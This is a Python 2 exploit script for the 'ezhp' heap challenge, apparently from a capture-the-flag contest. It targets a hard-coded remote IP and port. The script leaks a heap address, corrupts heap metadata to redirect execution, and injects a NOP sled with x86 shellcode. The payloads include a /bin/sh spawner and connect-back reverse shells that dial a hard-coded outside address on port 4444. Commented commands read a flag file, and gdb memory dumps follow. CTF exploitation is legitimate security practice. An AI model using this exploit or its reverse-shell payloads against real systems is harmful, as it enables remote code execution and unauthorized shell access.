__author__ = 'HuyNA'
"""
ezhp
Pwnables (200 pts)
Luckily when you travel back in time, you still get to use all your knowledge from the present. With that knowledge in hand,
breaking into this service (at 54.81.149.239:9174) owned by The Plague shouldn't be hard at all.
socat TCP-LISTEN:9174,reuseaddr,fork EXEC:./ezhp
"""

import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "54.81.149.239"
local_host="192.168.248.172"
port = 9174
s.connect((host, port))
#s.connect((local_host, port))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

#sys.stdin.read(1)
# add note 1
print recv_until(s, "Please choose an option.\n")
send_data = "1\n"
s.send(send_data)
print recv_until(s,"\n")
size = "4\n"
s.send(size)

time.sleep(0.01)
# add note 2
print recv_until(s, "Please choose an option.\n")
send_data = "1\n"
s.send(send_data)
print recv_until(s,"\n")
size = "4\n"
s.send(size)

# add note 4 + day shellcode len
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "1\n"
s.send(send_data)
print recv_until(s,"\n")
size = "121\n"
s.send(size)
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "3\n"
s.send(send_data)
print recv_until(s,"\n")
size = "2\n"
s.send(size)
print recv_until(s,"\n")
size = "121\n"   # size
s.send(size)
print recv_until(s,"\n")
shellcode = "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
connectback_shell = "\x33\xd2\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xd2\xd3\x7c\x85\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
connectback_shell_2 = "\x33\xd2\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x68\xd2\xd3\x7c\x85\x68\x11\x5c\x00\x00\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
connectback_shell_3 = "\xda\xd4\xba\xef\x6f\x05\x77\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x53\x17\x83\xc3\x04\x03\xbc\x7c\xe7\x82\x73\x58\x10\x8f\x20\x1d\x8c\x3a\xc4\x28\xd3\x0b\xae\xe7\x94\xff\x77\x48\xab\x32\x07\xe1\xad\x35\x6f\x20\x9e\xba\xea\xac\x23\x43\xe5\x70\xad\xa2\xb5\xef\xfd\x75\xe6\x5c\xfe\xfc\xe9\x6e\x81\xad\x81\x5f\xad\x22\x39\xc8\x9e\xa6\xd0\x66\x68\xc5\x70\x24\xe3\xeb\xc4\xc1\x3e\x6b"
size = "\x90"*(100-len(connectback_shell_3))+connectback_shell_3+"\x90\x90"*10+"\n"
s.send(size)

# change note 2
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "3\n"
s.send(send_data)
print recv_until(s,"\n")
size = "1\n"
s.send(size)
print recv_until(s,"\n")
size = "5\n"   # size
s.send(size)
print recv_until(s,"\n")
size = "\xFF\xE0"*2  # buffer
#size = "\x90"*4
s.send(size)

# change note 1
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "3\n"
s.send(send_data)
print recv_until(s,"\n")
size = "0\n"
s.send(size)
print recv_until(s,"\n")
size = "16\n"   # size
s.send(size)
print recv_until(s,"\n")
size = "1"*16  # buffer
s.send(size)

# view note 1 => leak heap address
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "4\n"
s.send(send_data)
print recv_until(s,"\n")
size = "0\n"    # id of note
s.send(size)

time.sleep(0.01)
data = recv_until(s, "Please choose an option.\n")

print data[16:20].encode("hex")
data = struct.unpack("<I",data[16:20])[0]
print hex(data)

# 0x08048a7e: jmp eax ;  (1 found)
jmp_eax = struct.pack("<I", data-0x0C)
pust_address = struct.pack("<I", 0x0804A008)
read_address = struct.pack("<I", 0x0804A000-4)
exit_address = struct.pack("<I", 0x0804A010-4)
#0x804c030
# 0044| 0x804c02c --> 0x804c00c --> 0x19      read_address-4

print "[+] # change note 1 ... again"
time.sleep(0.01)
send_data = "3\n"
s.send(send_data)
print recv_until(s,"\n")
size = "0\n"        # id change
s.send(size)
print recv_until(s,"\n")
size = "24\n"   # size
s.send(size)
print recv_until(s,"\n")
size = "2"*16 + jmp_eax + read_address # buffer
s.send(size)

print "[+] # remove note 2 => overwrite"
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "2\n"
s.send(send_data)
print recv_until(s,"\n")
size = "1\n"        # id to remove
s.send(size)
print recv_until(s,"\n")

print "[+] # change note 4 => trigger"
time.sleep(0.01)
print recv_until(s, "Please choose an option.\n")
send_data = "3\n"
s.send(send_data)
print recv_until(s,"\n")
size = "2\n"        # id change
s.send(size)
print recv_until(s,"\n")
size = "24\n"   # size
s.send(size)
print recv_until(s,"\n")

# send command
command = "cd home/admin;ls;\n"
command = "ldd --version;uname -a;cat /home/ezhp/flag.txt\n"
command = "cd /lib/i386-linux-gnu;ls -l\n"
#s.send(command)
"""

ldd (Debian EGLIBC 2.13-38+deb7u1) 2.13
total 16
-rwxr-xr-x 1 root root 9684 Apr 12 13:14 ezhp
-rw-r--r-- 1 root root   34 Apr 12 13:16 flag.txt
"""
#shitty_heap_allocators_are_shitty
print s.recv(102400)
# b *0x0804873B
# b *0x08048949
# x/4x 0x0804B060
# 31313131313131313131313131313131
# 3c304908 0849303c
# 0c304908 0849300c
# 0a506c656173
# 3c20b3090c20b3090a506c656173
# 3c2044090c2044090a506c656173

# 2147483648
#2247483648
"""
0000| 0x804c000 --> 0xc ('\x0c')
0004| 0x804c004 --> 0x804c00c --> 0x400
0008| 0x804c008 --> 0x0
0012| 0x804c00c --> 0x400
0016| 0x804c010 --> 0x0
0020| 0x804c014 --> 0x804c000 --> 0xc ('\x0c')
0024| 0x804c018 --> 0x0
0028| 0x804c01c --> 0x0
0032| 0x804c020 --> 0x0
0036| 0x804c024 --> 0x0

0000| 0x804c000 --> 0xc ('\x0c')
0004| 0x804c004 --> 0x804c00c --> 0x19
0008| 0x804c008 --> 0x0
0012| 0x804c00c --> 0x19
0016| 0x804c010 --> 0x804c024 ("1111<\300\004\b\f\300\004\b")
0020| 0x804c014 --> 0x804c000 --> 0xc ('\x0c')
0024| 0x804c018 ('1' <repeats 16 times>, "<\300\004\b\f\300\004\b")
0028| 0x804c01c ('1' <repeats 12 times>, "<\300\004\b\f\300\004\b")
0032| 0x804c020 ("11111111<\300\004\b\f\300\004\b")
0036| 0x804c024 ("1111<\300\004\b\f\300\004\b")
0040| 0x804c028 --> 0x804c03c --> 0x3d0     0x804c030
0044| 0x804c02c --> 0x804c00c --> 0x19      read_address-4
0048| 0x804c030 --> 0x0
0052| 0x804c034 --> 0x0
0056| 0x804c038 --> 0x0
0060| 0x804c03c --> 0x3d0
0064| 0x804c040 --> 0x0                     jmp_eax
0068| 0x804c044 --> 0x804c024               jmp_eax
0072| 0x804c048 --> 0x0
0076| 0x804c04c --> 0x0
"""